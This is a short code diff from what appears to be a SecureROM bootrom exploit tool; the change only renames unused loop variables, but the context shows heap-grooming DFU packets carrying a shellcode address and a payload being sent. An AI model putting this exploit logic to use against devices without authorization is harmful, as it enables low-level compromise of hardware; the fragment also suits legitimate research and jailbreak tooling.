@@ -82,7 +82,7 @@ def execute_securerom_payload(config: GalaConfig, payload: bytes) -> None:
 
         dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xCC)
         packet_cursor = 0
-        for i in range(0, len(dfu_packet_buf), 0x40):
+        for _ in range(0, len(dfu_packet_buf), 0x40):
             packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x405)
             packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x101)
             packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.shellcode_addr)
@@ -96,7 +96,7 @@ def execute_securerom_payload(config: GalaConfig, payload: bytes) -> None:
         # Fill the heap with more garbage
         print("Filling the heap with more garbage")
         dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xCC)
-        for i in range(0, exploit_info.receive_image_buf_size - 0x1800, exploit_info.dfu_max_packet_size):
+        for _ in range(0, exploit_info.receive_image_buf_size - 0x1800, exploit_info.dfu_max_packet_size):
             device.dfu_upload_data(dfu_packet_buf)
 
         print("Sending payload...")
